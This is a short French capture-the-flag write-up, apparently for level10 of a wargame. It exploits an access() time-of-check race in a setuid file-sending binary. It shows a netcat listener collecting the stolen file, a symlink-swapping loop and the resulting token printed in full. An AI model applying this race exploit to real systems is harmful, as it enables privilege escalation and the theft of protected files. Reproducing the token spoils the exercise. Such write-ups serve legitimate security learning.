`strings level10` m'indique que c'est un transfert de données sur le port 6969

`%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..`

`nm -u level10` et `gdb level10` m'indique qu'il y a une verification du fichier avec access

En faisant un `man access` on me dis très clairement qu'il y a une faille exploitable durant un cours laps de temps qui permet de by pass la verification de access.

Je lance un `nc -lk 6969 > /tmp/flag &`

Je lance un script shell
```bash
while true; do
    ln -fs ~/level10 /tmp/get; ln -fs ~/token /tmp/get;
done &
```
Ensuite je lance le binaire jusqu'a voir affiché 'woupa2yuojeeaaed06riuj63c'

qui me permet de me connecter avec su flag10